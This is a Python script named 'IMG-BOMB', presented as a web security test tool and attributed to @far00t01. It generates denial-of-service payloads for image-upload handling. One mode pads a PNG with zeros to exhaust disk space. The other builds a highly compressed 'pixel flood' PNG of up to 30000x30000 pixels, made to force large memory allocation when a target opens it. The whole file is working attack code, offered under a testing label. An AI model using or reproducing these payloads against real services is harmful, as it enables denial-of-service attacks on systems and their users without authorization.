#!/usr/bin/env python3
"""
IMG-BOMB - Security Test Tool for Web Application Vulnerabilities
Author: Fabian Rosales @far00t01
"""

import os
import sys
import zlib
import struct
import time

def mostrar_banner():
    banner = """┌──────────────────────────────────────┐
│                            ,--.!,    │
│      IMG Bomb v1.0.2      __/   -*-  │
│                          ,d08b.  '|` │
│        @far00t01         0088MM      │
│                          `9MMP'      │
└──────────────────────────────────────┘"""
    print(banner)

def calcular_bytes(cantidad, unidad):
    unidades = {'KB': 1024, 'MB': 1024**2, 'GB': 1024**3}
    return int(cantidad * unidades[unidad.upper()])

def disk_exhaustion_mode():
    print("\n┌──[ Mode: Disk Space Exhaustion ]")
    while True:
        try:
            entrada = input("├── Enter size (e.g., 5 KB, 500 MB, 1 GB) [or 'exit']: ").strip()
            if entrada.lower() == 'exit':
                print("└── [*] Returning to main menu.\n")
                return

            partes = entrada.split()
            if len(partes) != 2:
                print("├── [-] Format error. Use: 'Value Unit'\n")
                continue
            
            cantidad, unidad = float(partes[0]), partes[1].upper()
            if unidad not in ['KB', 'MB', 'GB']:
                print("├── [-] Use KB, MB, or GB.\n")
                continue
                
            bytes_totales = calcular_bytes(cantidad, unidad)
            nombre_salida = f"disk_exhaustion_{cantidad}{unidad}.png"
            png_header = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\xcf\xc0\x00\x00\x03\x01\x01\x00\x18\xdd\x8d\xb0\x00\x00\x00\x00IEND\xaeB`\x82'
            
            inicio_tiempo = time.time()
            bytes_escritos = 0

            with open(nombre_salida, 'wb') as f:
                f.write(png_header)
                bytes_escritos += len(png_header)
                
                if bytes_totales > len(png_header):
                    bytes_restantes = bytes_totales - len(png_header)
                    while bytes_restantes > 0:
                        escribir = min(bytes_restantes, 1024 * 1024) 
                        f.write(b'\x00' * escribir)
                        bytes_restantes -= escribir
                        bytes_escritos += escribir
                        
                        tiempo_pasado = time.time() - inicio_tiempo
                        porcentaje = (bytes_escritos / bytes_totales) * 100
                        
                        if tiempo_pasado > 0:
                            velocidad = bytes_escritos / tiempo_pasado  
                            bytes_que_faltan = bytes_totales - bytes_escritos
                            eta = bytes_que_faltan / velocidad  
                            
                            print(f"\r├── [+] Writing: {porcentaje:.1f}% | ETA: {eta:.1f}s | Speed: {velocidad / (1024**2):.1f} MB/s", end="", flush=True)

            print() 

            peso_real_bytes = os.path.getsize(nombre_salida)
            peso_real_mb = peso_real_bytes / (1024 * 1024)
            
            print(f"├── [✔] File '{nombre_salida}' saved successfully.")
            print("├── [ Verification Properties ]")
            print(f"│   ├── Real Size on Disk : {peso_real_bytes:,} Bytes ({peso_real_mb:.2f} MB)")
            print(f"│   └── File Format Check : Verified PNG Magic Bytes")
            print("└── [ Status: OK ]\n")
            return
        except (KeyboardInterrupt, EOFError):
            print("\n└── [*] Action canceled. Returning to main menu.\n")
            return
        except Exception as e:
            print(f"└── [-] Error: {e}\n")

def write_png_chunk(f, chunk_type, data):
    f.write(struct.pack(">I", len(data)))
    f.write(chunk_type)
    f.write(data)
    crc = zlib.crc32(chunk_type + data)
    f.write(struct.pack(">I", crc))

def pixel_flood_mode():
    print("\n┌──[ Mode: PNG Pixel Flood ]")
    try:
        ancho = int(input("├── Width (Default 30000): ") or 30000)
        alto = int(input("├── Height (Default 30000): ") or 30000)
        nombre_salida = f"pixel_flood_{ancho}x{alto}.png"
        
        print("├── [+] Compressing stream line-by-line (Level 9)...")
        
        png_signature = b'\x89PNG\r\n\x1a\n'
        ihdr_data = struct.pack(">IIBBBBB", ancho, alto, 8, 2, 0, 0, 0) # 8 bits, RGB
        
        row_p1 = b'\x00' + ((b'\xff\x00\x00' + b'\x00\x00\x00') * (ancho // 2) + (b'\xff\x00\x00' if ancho % 2 else b''))
        row_p2 = b'\x00' + ((b'\x00\x00\x00' + b'\xff\x00\x00') * (ancho // 2) + (b'\x00\x00\x00' if ancho % 2 else b''))

        compressor = zlib.compressobj(level=9)
        idat_compressed_data = b""
        
        inicio_tiempo = time.time()
        
        for i in range(alto):
            fila_actual = row_p1 if i % 2 == 0 else row_p2
            idat_compressed_data += compressor.compress(fila_actual)
            
            if i % 500 == 0 or i == alto - 1:
                filas_procesadas = i + 1
                tiempo_pasado = time.time() - inicio_tiempo
                porcentaje = (filas_procesadas / alto) * 100
                
                if tiempo_pasado > 0:
                    velocidad = filas_procesadas / tiempo_pasado 
                    filas_restantes = alto - filas_procesadas
                    eta = filas_restantes / velocidad  
                    
                    print(f"\r├── [+] Compressing: {porcentaje:.1f}% | ETA: {eta:.1f}s (Row {filas_procesadas}/{alto})", end="", flush=True)

        idat_compressed_data += compressor.flush()
        print()  

        print("├── [+] Writing finalized data to container structure...")
        with open(nombre_salida, 'wb') as f:
            f.write(png_signature)
            write_png_chunk(f, b'IHDR', ihdr_data)
            write_png_chunk(f, b'IDAT', idat_compressed_data)
            write_png_chunk(f, b'IEND', b'')

        peso_real_mb = os.path.getsize(nombre_salida) / (1024 * 1024)
        total_pixeles = (ancho * alto) / 1e6
        ram_estimada = (ancho * alto * 3) / (1024**3)
        
        print(f"├── [✔] File '{nombre_salida}' generated successfully.")
        print("├── [ Verification Properties ]")
        print(f"│   ├── Image Resolution  : {ancho} x {alto} pixels ({total_pixeles:.2f} Million Pixels)")
        print(f"│   ├── Compressed Size   : {peso_real_mb:.4f} MB")
        print(f"│   └── Memory Target RAM : ~{ram_estimada:.2f} GB estimated allocation on target open")
        print("└── [ Status: OK ]\n")
        
    except (KeyboardInterrupt, EOFError):
        print("\n└── [*] Action canceled. Returning to main menu.\n")
        return
    except Exception as e:
        print(f"└── [-] Error: {e}\n")

def main():
    mostrar_banner()
    while True:
        print("Select DoS vector:")
        print("  1) Disk Space Exhaustion")
        print("  2) PNG Pixel Flood")
        print("  3) Exit")
        opcion = input("\n[>] Option: ").strip()
        if opcion == '1': 
            disk_exhaustion_mode()
        elif opcion == '2': 
            pixel_flood_mode()
        elif opcion == '3': 
            print("[*] Exiting script...")
            break
        else: 
            print("[-] Invalid option.\n")

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, EOFError):
        print("\n\n[*] Interruption detected. Exiting cleanly...")
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
